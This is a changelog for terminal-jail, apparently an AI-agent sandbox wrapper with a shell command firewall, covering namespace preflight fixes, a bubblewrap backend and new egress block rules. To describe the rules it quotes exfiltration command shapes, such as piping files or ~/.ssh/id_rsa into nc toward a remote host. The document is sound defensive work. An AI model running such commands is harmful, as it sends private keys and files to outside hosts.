# Changelog

## [Unreleased]

### Degraded-host auto-sandbox (`modify`) preflight ordering (DF-TERMINAL-JAIL-11)

- **`standalone/terminal-jail`**: an `action=modify` rewrite already carries the interruptor bridge's own `unshare` prefix, and the wrapper's bare-mode namespace preflight describes the wrapper's **own** launch — which a rewrite never uses — so it must not gate the rewrite. Before this fix the bare probe ran first and, on a DEGRADED host (bare `unshare --mount-proc` denied while `unshare --user` works), exited `2` with `namespace creation failed (unshare exit 1); command not run — on unprivileged hosts try --user`: all 8 auto-sandbox classes (`make`, `pytest`, `go test`, `pip install`, `cargo`, `gcc`, `npm test`, `./script.sh`) were unusable end-to-end even though the bridge's own prefix runs fine. The wrapper now probes the **rewrite's own** flags (`unshare <flags> true`, extracted from the bridge's `<prefix> bash -c <payload>` rewrite shape) whenever a rewrite is present, and keeps the bare-mode probe for its own launch only. A rewrite whose own prefix cannot be created is reported as the honest `auto-sandbox modify unavailable` verdict (exit `2`, naming the flags probed) instead of the generic namespace-creation message; a rewrite that carries no `unshare` prefix adds no namespace at this layer and is executed as-is, which is what §4 already documented for `action=modify`. Bare mode for non-rewritten commands, `--user`, the mapped/legacy selection and the bwrap backend are untouched.
- **Tests**: `plugin/test_modify_preflight.py` (6 cases) drives both host shapes through an argv-recording `unshare` stub that models a DEGRADED host (any invocation without `--user` fails) and pass-throughs the payload so inner exit codes are real, plus a recorded bridge stand-in and the shipped bridge itself. Pinned arms: DEGRADED + rewrite runs and propagates the inner rc with the rewrite's own flags as the only probe (no `--mount-proc` probe anywhere); DEGRADED + uncreatable rewrite prefix → honest `auto-sandbox modify unavailable`, no generic message, rewrite never launched; DEGRADED + `allow` → bare mode still fail-closed with the unchanged message (control); FULL + rewrite → unchanged; non-`unshare` rewrite → no probe, executed as-is; real bridge + DEGRADED host → end-to-end. 5 of the 6 fail against the pre-fix wrapper (the `allow` control passes in both revisions by design).
- **Docs**: `specs/cli.md` §4 (extended launch forms) and §7 (required error behavior) state the modify-path preflight rule and its honest failure verdict; `README.md` (Graceful Degradation) and `docs/quickstart.md` (DEGRADED block) say the auto-sandbox rewrite is not gated by the bare-mode verdict; `skills/terminal-jail-usage/SKILL.md` pitfall 7 and `docs/dogfood/diagnostics.md` no longer describe the defect as current behaviour.

### Raw-socket file-exfiltration blocking + allowlist precedence (DF-TERMINAL-JAIL-16)

- **`plugin/terminal_jail/interruptor/blocklist.py`**: two new priority-1000 block rules complete the egress family TJ-GAP-058 left half-open (it covered shell *attaches*, nothing that carries data out). `builtin-net-file-exfil-pipe` blocks a local-file reader (`cat`, `dd`, `tar`, `gzip`, `base64`, `xxd`, `od`, `strings` — word-bounded, so `concat`/`odd`/`substrings` never match) piped into a bare raw-socket client (`nc`/`ncat`/`netcat`/`socat`), tolerating client flags, an fd merge (`2>&1`) and up to three intervening pipeline stages; the reader must carry a real operand, so a bare `base64 | nc host port` is not swept up. `builtin-net-file-exfil-redirect` blocks a bare raw-socket client whose payload comes from a local-file redirect (`nc 1.2.3.4 4444 < ~/.ssh/id_rsa`), excluding `/dev/null` and `/dev/stdin` sources. Both rules are **shape** rules — they also fire on non-secret files, and their block messages say so (DF-TERMINAL-JAIL-7 precedent: an inaccurate block message is itself a defect). Deliberate verdict change: `tar czf - <path> | nc <host> <port>` was an ALLOW pin under TJ-GAP-058 and is now the sanctioned block shape (`tar` is in the reader set, `nc` is a raw client); `tar czf - <path> | ssh host …` stays ALLOW.
- **`plugin/terminal_jail/interruptor/decider.py`**: no ordering change was needed — the rules are BLOCK rules, so the existing whole-command blocklist pass settles them before any per-segment layer. That precedence is the defect half: `allow-cat-safe` matched the pipeline's first segment and the Layer-2 allowlist short-circuited, so `cat <secret> | nc <host> <port>` returned an *approved* allow (`rule_id=allow-cat-safe`). It now returns `block` / `builtin-net-file-exfil-pipe`; the allowlist is untouched for every shape the new rules do not match (a lone `cat <file>` is still an approved allow). The comment at that pass records why the ordering is load-bearing.
- **Engine/YAML mirror parity**: both rules are mirrored byte-identically in `plugin/terminal_jail/rules/00-builtins.yaml` (the installed host mirror), whose header counts are corrected to the real per-layer totals (**28 block / 12 sandbox / 10 allow = 50**); `scripts/yaml-mirror-parity-probe.py` gains a behaviour battery for both new rules and reports `ALL PROBES PASS` with `block=28/28 sandbox=12/12 allow=10/10 total=50/50`.
- **Tests**: `plugin/test_escape_waves.py` and `plugin/test_interruptor.py` gain the block vectors (both arms, plain and wrapper-quoted) plus every pinned control — `nc -z host port`, `echo … | nc host port`, `cat f | grep x`, plain `cat <file>`, `nc -l`, `nc host port`, `/dev/null`+`/dev/stdin` sources, `tar … | ssh host`, `git push`, and the MODIFY controls (`cat log | python3 deploy.py` → `auto-script`, `curl -T` → `builtin-net-curl-upload`, `rsync -av ~/` → `builtin-net-remote-tree-copy`). A provenance test asserts the verdict for `cat <secret> | nc <host> <port>` is BLOCK with the exfil id and never `allow-cat-safe`, and a message test asserts each block message names the shape, the client set and the non-secret scope. All 37 new assertions fail against the pre-fix engine.
- **Docs**: `README.md` and `specs/interruptor.md` state the data-out boundary as a **named limitation** — BLOCKED (raw-socket file payloads), SANDBOXED-but-**not network-contained** (curl/wget uploads, rsync/scp tree copies: the namespace wrap does not restrict network access, so a sandboxed upload still reaches the network — DF-TERMINAL-JAIL-20; only a `block` stops an egress), and NOT CONTAINED (ssh/scp/rsync/git push shapes, command-generated payloads, interpreter sockets). README/`specs/interruptor.md`/`specs/integration.md`/`docs/quickstart.md` rule counts re-baselined to the real 50 (they had been stale since the TJ-GAP-053 wave), and `skills/terminal-jail-usage/SKILL.md` + `docs/dogfood/diagnostics.md` no longer describe the defect as current behaviour.

### Transparent auto-sandbox launch preflight (DF-TERMINAL-JAIL-15)

- **`plugin/terminal_jail/interruptor/userns.py`**: a `modify`/auto-sandbox rewrite no longer selects the uid-mapped `unshare` launch merely because the namespace can be CREATED. The new `mapped_file_access_ok()` proves the property a rewrite depends on — inside the candidate launch the payload must read a caller-owned mode-600 probe file the caller just created **and** write a probe file in the caller's current working directory — on an explicit, fail-closed timeout (a timeout counts as failure) and behind an injectable runner seam so both host shapes are unit-testable without a capable host. When the mapped launch is creatable but fails that property (the payload's host uid is the caller's subuid, so DAC denies the caller's repository and HOME) `unshare_prefix()` keeps the mapping-less prefix and prints ONE loud `no filesystem isolation` warning naming the cause and `TERMINAL_JAIL_UID_MAP=0`; a namespace-creation failure and `TERMINAL_JAIL_UID_MAP=0|off|false` keep the previous behaviour (legacy prefix, no new output). Measured on this host with a root-created mapped namespace: `read_rc=1 write_rc=1` (`Permission denied` on both probes) versus `read_rc=0 write_rc=0` for the mapping-less launch.
- **Unchanged**: the wrapper's explicit `--user` hard-isolation launch and its creation-only preflight, the `TERMINAL_JAIL_FS_ISOLATION` markers, the mapped flag strings (still the single source of truth in `userns.py`), and `scripts/fs-isolation-probe.py` semantics.
- **Tests**: `plugin/test_userns.py` gains `TestFileAccessPreflight` (capable-host fallback + exactly one warning, property-pass selection of the mapped prefix, both probe halves required, bounded probe budgets, timeout / launch-error / non-zero-exit fail-closed, scratch cleanup, no property probe — and no new warning — when namespace creation itself fails) and `TestFileAccessPreflightLive` (real `unshare`: the probe passes on a writable caller cwd and fails on an unwritable one).
- **Docs**: `README.md` (auto-sandbox rule list) and `specs/cli.md` (extended launch forms) state the new selection rule; neither claims filesystem isolation for the transparent auto-sandbox — the mapped launch is the explicit `--user` hard-isolation path.

### License-clean bubblewrap installation/dependency path (TJ-GAP-055)

- **`install.sh`**: a new advisory `NOTE` when `bwrap` is not on `PATH`. bubblewrap is optional, so the note is never a preflight error: a host without bubblewrap installs successfully and the CLI keeps the `unshare` backend. The installer still never downloads, builds, installs as a package, or vendors bubblewrap, and stays POSIX `sh`.
- **Packaging boundary stated**: `README.md` (Requirements + *Bubblewrap backend*), `specs/cli.md` §4 and `docs/quickstart.md` now say plainly that bubblewrap is an optional external distro package invoked from `PATH`, that this MIT-licensed repository does not vendor, bundle, download, build, or redistribute it (bubblewrap is LGPL-2.1-or-later under its own authors' terms — project packaging guidance, not legal advice), and that an explicitly demanded `TERMINAL_JAIL_JAIL_BACKEND=bwrap` still fails closed (exit 2, command not run) while `auto` falls back to `unshare`.
- **Docs**: `docs/dependency-audit.md` lists `bwrap` as an optional external dependency and records the installer's no-vendoring property.
- **Tests**: `plugin/test_install.py` covers the installer contract (advisory when absent with a still-successful install, silent when present, no bubblewrap artifact written into the install tree, and a source invariant that `install.sh` never downloads/builds/installs/vendors bubblewrap). `plugin/test_packaging.py` adds the tracked-tree verdict (no vendor/third-party tree, no submodule, no bubblewrap source file) and the documentation-claim contract over `README.md` / `specs/cli.md`. All cases are offline, host-independent, and need no `bwrap` binary.

### Optional bubblewrap (bwrap) jail backend (TJ-GAP-054)

- **`standalone/terminal-jail`**: runtime-detected backend selection via `TERMINAL_JAIL_JAIL_BACKEND=auto|bwrap|unshare` (default `auto`; no new CLI flags). `auto` uses bubblewrap when it is installed and its namespace probe passes, otherwise the unchanged `unshare` backend; `bwrap` is a demand that fails closed (exit 2, command not run) when bubblewrap is missing or unusable; `unshare` pins the pre-v1.2 behavior byte-for-byte; an unknown value exits 2 before any namespace work.
- **Private `/proc`**: the bwrap backend launches `bwrap --unshare-user --unshare-pid --die-with-parent --bind / / --dev-bind /dev /dev --proc /proc -- bash -c 'exec "$@"' terminal-jail …` — a fresh procfs the jail cannot use to enumerate host PIDs (measured: 5 entries vs 1682 host PIDs), plus `--die-with-parent` teardown that survives a SIGKILL of the wrapper. The unshare backend keeps its documented limitation (`--user` exposes the host `/proc`).
- **No silent downgrade, no traded-away isolation**: a present-but-unusable bubblewrap under `auto` warns that the fallback has no private `/proc` before continuing; `auto` keeps the `unshare` mapped launch for `--user` on mapping-capable hosts because bubblewrap has no unprivileged `--map-users` equivalent (`--uid` alone leaves DAC unchanged — measured), and `bwrap --user` states that loss loudly with `TERMINAL_JAIL_FS_ISOLATION=degraded`.
- **Deliberately not used**: `--as-pid-1` — it makes the payload namespace PID 1 and nullifies `--die-with-parent` (measured orphaned jail on bubblewrap 0.11.1). Consequence documented: under the bwrap backend the payload is PID 2 behind bubblewrap's reaper.
- **Devices**: `--dev-bind /dev /dev` is required next to `--bind / /`; with the bind alone the sandbox's `/dev/null`, `/dev/zero` and `/dev/urandom` return `EACCES`, which breaks payloads such as the `--seccomp` loader's Python interpreter.
- **Tests**: `plugin/test_backend_selection.py` (16 cases) covers selection, the documented flag contract, per-backend argv preservation, absence/failure/degradation paths, the `--user` mapping rule and live private-`/proc` + exit-semantics checks (host-conditional `HOST-DEGRADED-BWRAP` skips). `plugin/test_install.py`'s unshare-failure test now pins `TERMINAL_JAIL_JAIL_BACKEND=unshare` so it keeps asserting the same contract.
- **Docs**: `specs/cli.md` §1/§4 ("Jail backends")/§6/§7/§9/§10, `README.md` (How It Works, Components, Graceful Degradation, Requirements, Host Limitations), `docs/quickstart.md` (backend selection + FAQ), `docs/deploy-to-karahermes.md`.

### Docs & install path (2026-08-05)

- **Quick Start guide** (`docs/quickstart.md`): problem statement, which-component-for-which-user decision tree, install + verify steps for every path (CLI, interruptor modes, plugin, systemd drop-in, deploy shim), FAQ/troubleshooting. Linked from the README.
- **systemd drop-in honesty fix**: the shipped `systemd/90-terminal-jail-hardening.conf` is now explicitly labeled LIGHTWEIGHT (4 active directives) — README and `specs/systemd.md` no longer claim PRIMARY PID-namespace isolation; the full profile (`PrivateUsers`, `RestrictNamespaces`, network/fs) is documented as staged pending per-host verification.
- **Install path fix**: `install.sh` gained local-checkout mode (installs `standalone/terminal-jail` directly from a repo clone when release assets are absent); README Install now leads with the git-clone path and marks the release-URL one-liner as "when published". Scheduler registration `repo_url` corrected to `totalwindupflightsystems/terminal-jail` and pinned in `fleet.toml`.
- **CLI spec alignment** (`specs/cli.md`): documents the real v1.1 interface — `--user`, `--seccomp`, `--interruptor`, `--no-interruptor`, the `while`/`case` parser rules, extended launch forms, exit `126` for blocked commands, and the installer's local-checkout mode.
- **Deploy shim documented** (`standalone/terminal-jail-sh`): now env-configurable (`TERMINAL_JAIL_HOME` / `TERMINAL_JAIL_BRIDGE` / `TERMINAL_JAIL_CLI`) instead of hardcoded machine paths; listed in README Components; `docs/deploy-to-karahermes.md` heredoc updated to match.

## [1.1.0] — 2026-07-24

### Phase 11: Interruptor Bash Command Firewall

- **Parser**: Tokenizes shell commands — pipes, redirects, cmd substitution, heredocs, variable expansion, quoting. Fail-open to passthrough on parse errors.
- **Rule Loader**: YAML-based rules from `/etc/terminal-jail/rules.d/` and `~/.config/terminal-jail/rules.d/`. Lexical ordering, user rules override system.
- **Pattern Matcher**: 9 match types — pattern, command, pipeline, subcommand, path, composite, syscall, network, heredoc. Configurable per-rule.
- **Decider**: Blocklist-first, then allowlist, then auto-sandbox, then user rules. First match wins. 27 built-in rules (10 critical blocklist, 8 auto-sandbox, 9 always-allow).
- **Shell Integration**: JSON bridge (`interruptor_bridge.py`) — stdin/stdout protocol between bash CLI wrapper and Python engine. TERMINAL_JAIL_INTERRUPTOR_MODE: enforce/warn/disabled.
- **Testing**: 56 new Interruptor tests (T-I01 through T-I40), 6 integration tests for CLI compose.
- **Performance**: Cold start 0.08ms, warm start 0.027ms, 1KB parse 0.273ms, 500-rule eval 0.864ms.
- **Documentation**: Updated integration spec with 4-layer defense-in-depth diagram.

### Plugin Core
- PID namespace isolation via `unshare --pid --fork --mount-proc --kill-child=SIGKILL`
- Observability-only plugin architecture (command wrapping lives in Hermes backend/CLI layers)
- Register-based Hermes hook manifest (`pre_tool_call`, `transform_terminal_output`)
- Configurable log levels via `HERMES_TERMINAL_JAIL_LOG_LEVEL`
- Graceful degrade when `unshare` is missing from PATH

### Standalone CLI
- Universal `terminal-jail` bash wrapper (56 lines)
- Works outside Hermes — wraps any command in a PID namespace
- `--help` and `--version` flags
- Byte-exact exit code propagation

### systemd Hardening
- Graduated `90-terminal-jail-hardening.conf` drop-in (14 directives)
- Safe directives active by default, dangerous ones commented
- Rollback procedure documented (<10s downtime)
- Defense-in-depth: `ProtectSystem=strict`, `PrivateUsers=true`, `RestrictNamespaces=~pid`

### Hermes Core Integration
- `--sandbox` CLI flag submitted as upstream PR (#68216)
- Backend-layer command wrapping (`tools/environments/local.py`)
- `terminal.jail_enabled` config key

### Testing
- 108 unit + integration tests (26 skipped — require real `unshare --mount-proc`)
- Real unshare integration tests: fork bomb containment, killall containment, exit code propagation, stdout/stderr integrity, nested jails, signal handling, performance benchmark, env var isolation
- Standalone CLI tests (15 tests)
- install.sh tests (11 tests)
- Metrics export tests (21 tests)
- Edge-case coverage: NUL bytes, non-str input, budget exceptions

### Observability
- Jail metrics counters (wrapped, passed-through, missing-unshare, crashes)
- Byte budget tracking and rejection logging
- Performance regression alerts (p99 > 50ms)
- DuckBrain metrics exporter

### Documentation
- 4 axiom-level specs (plugin, CLI, systemd, integration)
- 5 architecture decision records (ADR-001 through ADR-005)
- Threat-aware: all Phase 5-6 deployment tasks documented as BLOCKED by host limitations
- CONTRIBUTING.md
